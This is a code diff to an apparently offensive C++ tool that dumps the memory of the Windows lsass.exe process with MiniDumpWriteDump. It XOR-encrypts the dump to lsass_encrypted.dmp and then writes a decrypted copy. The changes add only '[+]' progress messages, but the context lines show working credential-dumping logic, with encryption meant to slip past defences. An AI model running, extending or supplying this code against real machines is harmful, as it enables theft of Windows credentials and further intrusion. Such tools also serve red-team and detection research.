@@ -114,6 +114,8 @@ bool DumpLsassToMemoryBuffer(std::vector<BYTE>& outputBuffer) {
 
     if (!hLsass) return false;
 
+    std::cout << "[+] Got handle on lsass.exe" << std::endl;
+
     WCHAR tempPath[MAX_PATH] = {};
     WCHAR tempFileName[MAX_PATH] = {};
 
@@ -137,10 +139,13 @@ bool DumpLsassToMemoryBuffer(std::vector<BYTE>& outputBuffer) {
         NULL
     );
 
+    
     if (hFile == INVALID_HANDLE_VALUE) {
         CloseHandle(hLsass);
         return false;
     }
+
+    std::cout << "[+] Created temporary file for dumping" << std::endl;
 
     HMODULE hDbgHelp = LoadLibraryW(L"dbghelp.dll");
     if (!hDbgHelp) {
@@ -186,6 +191,8 @@ bool DumpLsassToMemoryBuffer(std::vector<BYTE>& outputBuffer) {
         CloseHandle(hLsass);
         return false;
     }
+
+    std::cout << "[+] Successfully dumped lsass with MiniDumpWriteDump" << std::endl;
 
     DWORD fileSize = GetFileSize(hFile, NULL);
     if (fileSize == INVALID_FILE_SIZE || fileSize == 0) {
@@ -260,6 +267,8 @@ int main() {
         outputBuffer[i] ^= XOR_KEY;
     }
 
+    std::cout << "[+] Encrypting dump and writing to lsass_encrypted.dmp" << std::endl;
+
     // Write encrypted dump
     HANDLE encryptedFile = CreateFileA("lsass_encrypted.dmp", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
     if (encryptedFile != INVALID_HANDLE_VALUE) {
@@ -272,6 +281,8 @@ int main() {
     for (size_t i = 0; i < outputBuffer.size(); ++i) {
         outputBuffer[i] ^= XOR_KEY;
     }
+
+    std::cout << "[+] Decrypting the buffer to lsass_decrypted.dmp for demostration purposes" << std::endl;
 
     HANDLE decryptedFile = CreateFileA("lsass_decrypted.dmp", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
     if (decryptedFile != INVALID_HANDLE_VALUE) {
